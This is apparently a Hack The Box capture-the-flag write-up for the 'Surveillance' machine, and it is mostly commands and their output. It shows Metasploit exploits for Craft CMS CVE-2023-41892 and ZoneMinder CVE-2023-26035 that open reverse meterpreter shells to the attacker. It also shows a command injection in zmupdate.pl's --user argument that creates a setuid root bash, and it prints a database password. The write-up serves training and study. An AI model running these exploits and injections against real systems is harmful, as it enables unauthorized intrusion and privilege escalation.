# Target
| Category          | Details                                                                         |
|-------------------|---------------------------------------------------------------------------------|
| 📝 **Name**       | [Surveillance](https://app.hackthebox.com/machines/Surveillance)                |  
| 🏷 **Type**       | HTB Machine                                                                     |
| 🖥 **OS**         | Linux                                                                           |
| 🎯 **Difficulty** | Medium                                                                          |
| 📁 **Tags**       | Metasploit, CraftCMS 4.4.14, CVE-2023-41892, Zoneminder 1.36.22, CVE-2023-26035 |

# Scan
```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
```

# Attack path
1. [Gain initial foothold by exploiting CVE-2023-41892 in CraftCMS 4.4.14](#gain-initial-foothold-by-exploiting-cve-2023-41892-in-craftcms-4414)
2. [Escalate to `zoneminder` user by exploiting CVE-2023-26035 in Zoneminder 1.36.22](#escalate-to-zoneminder-user-by-exploiting-cve-2023-26035-in-zoneminder-13622)
3. [Escalate to `root` user by exploiting command injection vulnerability in `zmupdate.pl` script](#escalate-to-root-user-by-exploiting-command-injection-vulnerability-in-zmupdatepl-script)

### Gain initial foothold by exploiting [CVE-2023-41892](https://nvd.nist.gov/vuln/detail/CVE-2023-41892) in CraftCMS 4.4.14

#### Add `surveillance.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Surveillance]
└─$ echo "$TARGET surveillance.htb" | sudo tee -a /etc/hosts
10.129.230.42 surveillance.htb
```

#### Identify Craft CMS 4.4.14 running on target
```
┌──(magicrc㉿perun)-[~/attack/HTB Surveillance]
└─$ curl -I surveillance.htb                   
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 17 Sep 2025 14:20:04 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: Craft CMS
                                                                                                                                                                                                   
┌──(magicrc㉿perun)-[~/attack/HTB Surveillance]
└─$ curl -s surveillance.htb | grep 'Craft CMS'
        SURVEILLANCE.HTB</a><br> <b>Powered by <a href="https://github.com/craftcms/cms/tree/4.4.14"/>Craft CMS</a></b>
```

#### Use `exploit/linux/http/craftcms_unauth_rce_cve_2023_41892` Metasploit module to exploit [CVE-2023-41892](https://nvd.nist.gov/vuln/detail/CVE-2023-41892) to gain foothold
```
┌──(magicrc㉿perun)-[~/attack/HTB Surveillance]
└─$ msfconsole -q                                                                                                                   
[*] Starting persistent handler(s)...
msf > use craftcms_unauth_rce_cve_2023_41892
[*] Using exploit/linux/http/craftcms_unauth_rce_cve_2023_41892
[*] Using configured payload php/meterpreter/reverse_tcp
msf exploit(linux/http/craftcms_unauth_rce_cve_2023_41892) > set RHOST http://surveillance.htb/
RHOST => http://surveillance.htb/
msf exploit(linux/http/craftcms_unauth_rce_cve_2023_41892) > set LHOST tun0
LHOST => tun0
msf exploit(linux/http/craftcms_unauth_rce_cve_2023_41892) > run
[*] Started reverse TCP handler on 10.10.16.34:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Executing PHP for php/meterpreter/reverse_tcp
[*] Sending stage (40004 bytes) to 10.129.230.42
[+] Deleted /var/www/html/craft/web/mCpzCllLknxSkYoH.php
[+] Deleted /tmp/phpoj0Gnj
[*] Meterpreter session 1 opened (10.10.16.34:4444 -> 10.129.230.42:47482) at 2025-09-17 10:41:48 +0200

meterpreter > getuid
Server username: www-data
```

### Escalate to `zoneminder` user by exploiting [CVE-2023-26035](https://nvd.nist.gov/vuln/detail/CVE-2023-26035) in Zoneminder 1.36.22

#### Identify Zoneminder 1.36.22 running on `127.0.0.1:8080`
Opened port and databases credentials were found using `linpeas`.
```
meterpreter > shell
Process 49106 created.
Channel 5 created.
mysql -u zmuser -pZoneMinderPassword2023 -D zm  --batch --skip-column-names -e "SELECT Value FROM Config where Name = 'ZM_DYN_CURR_VERSION';"
1.36.32
```

#### Use `exploit/unix/webapp/zoneminder_snapshots` Metasploit module to exploit [CVE-2023-26035](https://nvd.nist.gov/vuln/detail/CVE-2023-26035)
```
meterpreter > portfwd add -l 8080 -p 8080 -r 127.0.0.1
[*] Forward TCP relay created: (local) :8080 -> (remote) 127.0.0.1:8080
meterpreter > background
[*] Backgrounding session 1...
msf exploit(linux/http/craftcms_unauth_rce_cve_2023_41892) > use exploit/unix/webapp/zoneminder_snapshots
[*] Using configured payload cmd/linux/http/x64/meterpreter/reverse_tcp
msf exploit(unix/webapp/zoneminder_snapshots) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf exploit(unix/webapp/zoneminder_snapshots) > set RPORT 8080
RPORT => 8080
msf exploit(unix/webapp/zoneminder_snapshots) > set TARGETURI /
TARGETURI => /
msf exploit(unix/webapp/zoneminder_snapshots) > set SRVPORT 8081
SRVPORT => 8081
msf exploit(unix/webapp/zoneminder_snapshots) > set FETCH_SRVPORT 8081
FETCH_SRVPORT => 8081
msf exploit(unix/webapp/zoneminder_snapshots) > set LHOST tun0
LHOST => 10.10.16.34
msf exploit(unix/webapp/zoneminder_snapshots) > set LPORT 5555
LPORT => 5555
msf exploit(unix/webapp/zoneminder_snapshots) > run
[*] Started reverse TCP handler on 10.10.16.34:5555 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Elapsed time: 10.718996059003985 seconds.
[+] The target is vulnerable.
[*] Fetching CSRF Token
[+] Got Token: key:713896ea92c3a06ef8257a0a5b7565555ae77650,1758176397
[*] Executing nix Command for cmd/linux/http/x64/meterpreter/reverse_tcp
[*] Sending payload
[*] Sending stage (3090404 bytes) to 10.129.230.42
[*] Meterpreter session 2 opened (10.10.16.34:5555 -> 10.129.230.42:47420) at 2025-09-18 08:20:00 +0200
[+] Payload sent

meterpreter > getuid
Server username: zoneminder
```

### Escalate to `root` user by exploiting command injection vulnerability in `zmupdate.pl` script

#### List allowed sudo commands
```
meterpreter > shell
Process 56019 created.
Channel 1 created.
/usr/bin/script -qc /bin/bash /dev/null
zoneminder@surveillance:/usr/share/zoneminder/www$ sudo -l
sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
```

#### List Perl scripts for potential privileges escalation
```
zoneminder@surveillance:/usr/share/zoneminder/www$ ls -l /usr/bin/zm*.pl
ls -l /usr/bin/zm*.pl
-rwxr-xr-x 1 root root 43027 Nov 23  2022 /usr/bin/zmaudit.pl
-rwxr-xr-x 1 root root 12939 Nov 23  2022 /usr/bin/zmcamtool.pl
-rwxr-xr-x 1 root root  6043 Nov 23  2022 /usr/bin/zmcontrol.pl
-rwxr-xr-x 1 root root 26232 Nov 23  2022 /usr/bin/zmdc.pl
-rwxr-xr-x 1 root root 35206 Nov 23  2022 /usr/bin/zmfilter.pl
-rwxr-xr-x 1 root root  5640 Nov 23  2022 /usr/bin/zmonvif-probe.pl
-rwxr-xr-x 1 root root 19386 Nov 23  2022 /usr/bin/zmonvif-trigger.pl
-rwxr-xr-x 1 root root 13994 Nov 23  2022 /usr/bin/zmpkg.pl
-rwxr-xr-x 1 root root 17492 Nov 23  2022 /usr/bin/zmrecover.pl
-rwxr-xr-x 1 root root  4815 Nov 23  2022 /usr/bin/zmstats.pl
-rwxr-xr-x 1 root root  2133 Nov 23  2022 /usr/bin/zmsystemctl.pl
-rwxr-xr-x 1 root root 13111 Nov 23  2022 /usr/bin/zmtelemetry.pl
-rwxr-xr-x 1 root root  5340 Nov 23  2022 /usr/bin/zmtrack.pl
-rwxr-xr-x 1 root root 18482 Nov 23  2022 /usr/bin/zmtrigger.pl
-rwxr-xr-x 1 root root 45421 Nov 23  2022 /usr/bin/zmupdate.pl
-rwxr-xr-x 1 root root  8205 Nov 23  2022 /usr/bin/zmvideo.pl
-rwxr-xr-x 1 root root  7022 Nov 23  2022 /usr/bin/zmwatch.pl
-rwxr-xr-x 1 root root 19655 Nov 23  2022 /usr/bin/zmx10.pl
```

#### Identify command injection vulnerability in `zmupdate.pl`
Command injection vulnerability, in `--user` parameter sits in line 1007.
```
zoneminder@surveillance:/usr/share/zoneminder/www$ cat -n /usr/bin/zmupdate.pl
<SNIP>
   998  sub patchDB {
   999    my $dbh = shift;
  1000    my $version = shift;
  1001
  1002    my ( $host, $portOrSocket ) = ( $Config{ZM_DB_HOST} =~ /^([^:]+)(?::(.+))?$/ ) if $Config{ZM_DB_HOST};
  1003    my $command = 'mysql';
  1004    if ($super) {
  1005      $command .= ' --defaults-file=/etc/mysql/debian.cnf';
  1006    } elsif ($dbUser) {
  1007      $command .= ' -u'.$dbUser;
  1008      $command .= ' -p\''.$dbPass.'\'' if $dbPass;
  1009    }
  1010    if ( defined($portOrSocket) ) {
  1011      if ( $portOrSocket =~ /^\// ) {
  1012        $command .= ' -S'.$portOrSocket;
  1013      } else {
  1014        $command .= ' -h'.$host.' -P'.$portOrSocket;
  1015      }
  1016    } elsif ( $host ) {
  1017      $command .= ' -h'.$host;
  1018    }
  1019    $command .= ' '.$Config{ZM_DB_NAME}.' < ';
  1020    if ( $updateDir ) {
  1021      $command .= $updateDir;
  1022    } else {
  1023      $command .= $Config{ZM_PATH_DATA}.'/db';
  1024    }
  1025    $command .= '/zm_update-'.$version.'.sql';
  1026
  1027    print("Executing '$command'\n") if logDebugging();
  1028    ($command) = $command =~ /(.*)/; # detaint
  1029    my $output = qx($command);
  1030    my $status = $? >> 8;
  1031    if ( $status || logDebugging() ) {
  1032      chomp($output);
  1033      print("Output: $output\n");
  1034    }
  1035    if ( $status ) {
  1036      die("Command '$command' exited with status: $status\n");
  1037    }
  1038    print("\nDatabase successfully upgraded to version $version.\n");
  1039  } # end sub patchDB
<SNIP>
```

#### Exploit command injection vulnerability to spawn root shell
```
zoneminder@surveillance:/usr/share/zoneminder/www$ sudo /usr/bin/zmupdate.pl --version=1 --user=';cp /bin/bash /tmp/root_shell;chmod +s /tmp/root_shell;'; /tmp/root_shell -p
<hell;chmod +s /tmp/root_shell;'; /tmp/root_shell -p

Initiating database upgrade to version 1.36.32 from version 1

WARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?
Press enter to continue or ctrl-C to abort : 


Do you wish to take a backup of your database prior to upgrading?
This may result in a large file in /tmp/zm if you have a lot of events.
Press 'y' for a backup or 'n' to continue : n
n

Upgrading database to version 1.36.32
Upgrading DB to 1.26.1 from 1.26.0
mysql: option '-u' requires an argument
sh: 1: -pZoneMinderPassword2023: not found
Output: 
Command 'mysql -u;cp /bin/bash /tmp/root_shell;chmod +s /tmp/root_shell; -p'ZoneMinderPassword2023' -hlocalhost zm < /usr/share/zoneminder/db/zm_update-1.26.1.sql' exited with status: 127
root_shell-5.1# id
id
uid=1001(zoneminder) gid=1001(zoneminder) euid=0(root) egid=0(root) groups=0(root),1001(zoneminder)
```

